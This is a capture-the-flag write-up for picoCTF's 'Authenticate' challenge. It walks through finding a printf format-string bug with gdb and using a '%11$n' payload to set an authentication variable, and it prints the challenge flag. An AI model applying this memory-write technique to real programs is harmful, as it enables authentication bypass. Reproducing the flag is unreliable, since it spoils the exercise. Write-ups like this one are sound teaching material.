# Authenticate - Pwn

On this challenge, we get this source code:
```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/types.h>

int authenticated = 0;

int flag() {
  char flag[48];
  FILE *file;
  file = fopen("flag.txt", "r");
  if (file == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(flag, sizeof(flag), file);
  printf("%s", flag);
  return 0;
}

void read_flag() {
  if (!authenticated) {
    printf("Sorry, you are not *authenticated*!\n");
  }
  else {
    printf("Access Granted.\n");
    flag();
  }

}

int main(int argc, char **argv) {

  setvbuf(stdout, NULL, _IONBF, 0);

  char buf[64];
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  
  printf("Would you like to read the flag? (yes/no)\n");

  fgets(buf, sizeof(buf), stdin);
  
  if (strstr(buf, "no") != NULL) {
    printf("Okay, Exiting...\n");
    exit(1);
  }
  else if (strstr(buf, "yes") == NULL) {
    puts("Received Unknown Input:\n");
    printf(buf);
  }
  
  read_flag();

}
```

Here we see that we need to get authenticated to equal 1 in order to get the flag. We then find a format string vulnerability on this line:
```printf(buf);```

First we fire up gdb and diassemble the read_flag function:
```
gdb-peda$ disas read_flag
Dump of assembler code for function read_flag:
   0x080486e4 <+0>:    push   ebp
   0x080486e5 <+1>:    mov    ebp,esp
   0x080486e7 <+3>:    sub    esp,0x8
   0x080486ea <+6>:    mov    eax,ds:0x804a04c
   0x080486ef <+11>:    test   eax,eax
   0x080486f1 <+13>:    jne    0x8048705 <read_flag+33>
   0x080486f3 <+15>:    sub    esp,0xc
   0x080486f6 <+18>:    push   0x8048934
   0x080486fb <+23>:    call   0x80484f0 <puts@plt>
   0x08048700 <+28>:    add    esp,0x10
   0x08048703 <+31>:    jmp    0x804871a <read_flag+54>
   0x08048705 <+33>:    sub    esp,0xc
   0x08048708 <+36>:    push   0x8048958
   0x0804870d <+41>:    call   0x80484f0 <puts@plt>
   0x08048712 <+46>:    add    esp,0x10
   0x08048715 <+49>:    call   0x804865b <flag>
   0x0804871a <+54>:    nop
   0x0804871b <+55>:    leave  
   0x0804871c <+56>:    ret    
End of assembler dump.```

Here we see this line:
```0x080486ea <+6>:    mov    eax,ds:0x804a04c```

This will move the authenticated variable into the register EAX, and ds stands for data segment. This instruction is hardcoded which means that authenticated variable will always be on this address, and this makes it easier for us.

First I need to check where I can set breakpoint in main to be able to see how the stack looks after the call to the vulnerable function printf as I mentioned earlier.

```
....
0x080487e5 <+200>:	push   0x80489aa
   0x080487ea <+205>:	call   0x80484f0 <puts@plt>
   0x080487ef <+210>:	add    esp,0x10
   0x080487f2 <+213>:	sub    esp,0xc
   0x080487f5 <+216>:	lea    eax,[ebp-0x4c]
   0x080487f8 <+219>:	push   eax
   0x080487f9 <+220>:	call   0x80484b0 <printf@plt>
   0x080487fe <+225>:	add    esp,0x10
   0x08048801 <+228>:	call   0x80486e4 <read_flag>
   0x08048806 <+233>:	mov    eax,0x0
   0x0804880b <+238>:	mov    edx,DWORD PTR [ebp-0xc]
....
```

I set a breakpoint after the printf line here with:
``` b * 0x080487fe```

Then I run this:
```run <<< $(python -c 'print "\x4c\xa0\x04\x08%p%p%p%p%p"')```
To start the program and %p prints what is on the stack. I then use ```x/xw $esp``` to see how the stack looks like:
```
gdb-peda$ x/xw $esp
0xffffd280:    0xffffd2ac
gdb-peda$ 
0xffffd284:    0x080489a6
gdb-peda$ 
0xffffd288:    0xf7fa15c0
gdb-peda$ 
0xffffd28c:    0x0804875a
gdb-peda$ 
0xffffd290:    0x00000000
gdb-peda$ 
0xffffd294:    0x00ca0000
gdb-peda$ 
0xffffd298:    0x00000000
gdb-peda$ 
0xffffd29c:    0xffffd3a4
gdb-peda$ 
0xffffd2a0:    0x00000000
gdb-peda$ 
0xffffd2a4:    0x00000000
gdb-peda$ 
0xffffd2a8:    0x00000000
gdb-peda$ 
0xffffd2ac:    0x0804a04c
```
We see here that the address 0x0804a04c is on the 11th step, which means that when we run this:
```python -c 'print "\x4c\xa0\x04\x08%11$p"' | ./auth ```
Here, ```$``` says which place on the stack we should write/read from. From the output on the command above, we should get the address and that is what we get:
```
Would you like to read the flag? (yes/no)
Received Unknown Input:

L�0x804a04c
Sorry, you are not *authenticated*!
```

Now we need to write something to the stack and we can use %n for that. So we change from %p to %n

```python -c 'print "\x4c\xa0\x04\x08%11$n"' | nc 2018shell2.picoctf.com 26336```

The %n prints out the length of what has been printed out from printf which is 4 in this case, so authenticated will contain the number 4 which works because authenticated will be true as long as it is not 0.

If we run the command above, we get the flag: 
```
Would you like to read the flag? (yes/no)
Received Unknown Input:

Access Granted.
picoCTF{y0u_4r3_n0w_aUtH3nt1c4t3d_e8337b91}
````

